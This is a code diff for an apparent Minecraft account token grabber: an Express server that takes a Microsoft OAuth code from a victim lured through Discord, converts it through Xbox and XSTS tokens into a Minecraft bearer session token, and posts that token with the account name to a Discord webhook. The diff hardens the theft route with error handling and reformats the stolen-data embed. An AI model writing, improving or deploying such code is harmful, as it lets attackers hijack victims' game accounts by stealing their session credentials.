@@ -12,22 +12,22 @@ const port = process.env.PORT || 3000
 app.get('/', async (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
     const code = req.query.code
-    console.log(code + " is the code\n")
-    const accessToken = await getAccessToken(code)
-    console.log(accessToken + " is the access token\n")
-    const hashAndTokenArray = await getUserHashAndToken(accessToken)
-    const userToken = hashAndTokenArray[0]
-    console.log(userToken + " is the user token\n")
-    const userHash = hashAndTokenArray[1]
-    console.log(userToken + " is the user hash\n")
-    const xstsToken = await getXSTSToken(userToken)
-    console.log(xstsToken + " is the xsts token\n")
-    const bearerAndUsernameArray = await getBearerTokenAndUsername(xstsToken, userHash)
-    const bearerToken = bearerAndUsernameArray[0]
-    console.log(bearerToken + " is the bearer token\n")
-    const username = bearerAndUsernameArray[1]
-    console.log(username + " is the username\n")
-    postToWebhook(username, bearerToken)
+    if (code == null) {
+        return
+    }
+    try {
+        const accessToken = await getAccessToken(code)
+        const hashAndTokenArray = await getUserHashAndToken(accessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerAndUsernameArray = await getBearerTokenAndUsername(xstsToken, userHash)
+        const bearerToken = bearerAndUsernameArray[0]
+        const username = bearerAndUsernameArray[1]
+        postToWebhook(username, bearerToken)
+    } catch (e) {
+        console.log(e)
+    }
 })
 
 app.listen(port, () => {
@@ -109,8 +109,11 @@ function postToWebhook(username, bearerToken) {
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
         content: "||@everyone||",
         embeds: [{
-            title: "User Info", description: `Username: ${username}\nBearer Token: ${bearerToken}`, color: 0x00ff00
+            title: "User Info", color: 0x00ff00, fields: [
+                {name: "UUID", value: username},
+                {name: "Bearer Token (SessionID)", value: bearerToken},
+            ]
         }]
     }
-    axios.post(url, data).then(r => console.log(r.data))
+    axios.post(url, data).then(r => console.log("Successfully authenticated, posting to webhook!"))
 }
